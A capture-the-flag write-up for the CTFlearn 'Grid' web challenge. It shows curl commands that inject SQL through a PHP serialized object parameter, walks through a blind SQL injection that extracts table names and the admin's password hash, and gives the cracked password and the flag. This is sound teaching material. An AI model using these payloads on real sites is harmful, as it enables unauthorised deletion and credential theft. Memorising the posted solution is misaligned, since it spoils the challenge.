# Solution

### Login page
After visiting the given URL we see a simple register/login panel. After some trying, we can easily give up any idea of **SQL/null-byte Injection**, because username/password can contain any character (even null-byte!). 

### Grid It
After successful logging in, we see a 2d  plane where we can either *add* or *remove* points. This is the only functionality of the site, so it is most likely our target to explore. We notice that any request goes through `controller.php?action=` where `action=` can be followed by either `login`, `register`, `logout`, `add_point`, `delete_point` or hidden `debug`. 

### Adding points
Adding points is as simple as sending the request: `POST /controller.php?action=add_point data="x={x}&y={y}"`. 

The page is refusing to add a point which contains any non-digit character so at this stage we skip it.
```sh
$ curl --cookie @sessid 'http://web.ctflearn.com/grid/controller.php?action=add_point' --data 'x=a' 
Must pass in both parameters.

$ curl --cookie @sessid 'http://web.ctflearn.com/grid/controller.php?action=add_point' --data 'x=a&y=b'
Must pass in digits.
```

### PHP Object Injection
We recieve a list of added points
```
ID: 507868 x: 300 y: 300 delete
ID: 507869 x: 400 y: 400 delete
```
 where *delete* links to: `http://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:3:"300";s:1:"y";s:3:"300";s:2:"ID";s:6:"507868";}`


We notice that `point` paramentr contains a **PHP serialized object**. First thing I tried was modifying the given object with a simple **SQL Injection** :
```sh
$ curl --cookie @sessid  'http://web.ctflearn.com/grid/controller.php?action=delete_point' --data-urlencode 'point=O:5:"point":3:{s:1:"x";s:3:"300";s:1:"y";s:3:"300";s:2:"ID";s:11:"507868 OR 1";}' --get
```

And voila, all of the points have vanished! 

In the mean time I had also tried more advanced object manipulation. For example, giving a wrong formatted serialized data results with the following error: 
> <br />
> <b>Notice</b>:  unserialize(): Error at offset 62 of 70 bytes in <b>/usr/share/nginx/html/web/grid/controller.php</b>on line <b>65</b><br />
> <br />
> <b>Fatal error</b>:  Call to a member function delete() on a non-object in <b>/usr/share/nginx/html/web/grid/controller.php</b> on line <b>66</b><br />

We read that `delete()` function is invoked on `point` object so maybe we could do some **PHP Object Injection**?
After quick listing classes containing `::delete()` method we get the following:
```sh
$ php -a
Interactive mode enabled

php >   foreach (get_declared_classes() as $class) {
php {     foreach (get_class_methods($class) as $method) {
php {       if ($method == "delete")
php {         echo "$class->$method\n";
php {     }
php {   }
Phar->delete
PharData->delete
```

Comes out that these classes (*Phar* and *PharData*) seem pretty useless in this task, especially that they cannot be even serialized! Looking at the receiving header: `X-Powered-By: PHP/5.5.9-1ubuntu4.22` we notice that the version of PHP is `PHP/5.5.9` which has a lot of [vulnerabilities]. Some are about *deserialization*, but let's return to the **SQL Injection**. 

### Blind SQL Injection
We suspect that the *SQL query* looks something like `DELETE FROM ... WHERE ID={} ...`, but we don't get any output from executing the query, so we have to do a **Blind SQL Injection**. 

The idea of the attack is to fetch an information about *table* and *column names* inside given database. Our queries will look like: `DELETE FROM ... WHERE ID={1337} AND {QUERY}` where if `QUERY` returns `true` point of id `1337` gets removed and nothing happens otherwise. Let's create an example query: `..ID=507868 AND Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1),1,1))>97`. We are fetching the first character of the returned the first table name (it is important that `SELECT` returns exactly one record, that's what `LIMIT 0, 1` is for) and comparing it with 'a' character. Now we can do a **binary search** for each character to determine which one it is and by repeating the process to fetch the whole name.

After repeating the process and increassing offsets in `LIMIT {offset},1` and `substring(..., {start}, 1)` we get two tables with six columns in summary:

| point | | |
| ----- | - | - |
| id | point_blob | uid |

| user | | |
| - | - | - |
| username | password | uid |

Now we just need to fetch admin's password and we can do so by executing the following query `.. AND Ascii(substring((SELECT password FROM user WHERE username='admin' LIMIT 0,1),{word_offset},1))>{comparing_char}` which gives us a *MD5 hash* `0c2c99a4ad05d39177c30b30531b119b`. And after cracking it we get the real password: `grapevine`.

### Flag
After logging in into admin's account, we are given the flag: `ctflearn{obj3ct_inj3ct1on}` whose name is very confusing, because it wasn't an object injection at all, just some simple object modification!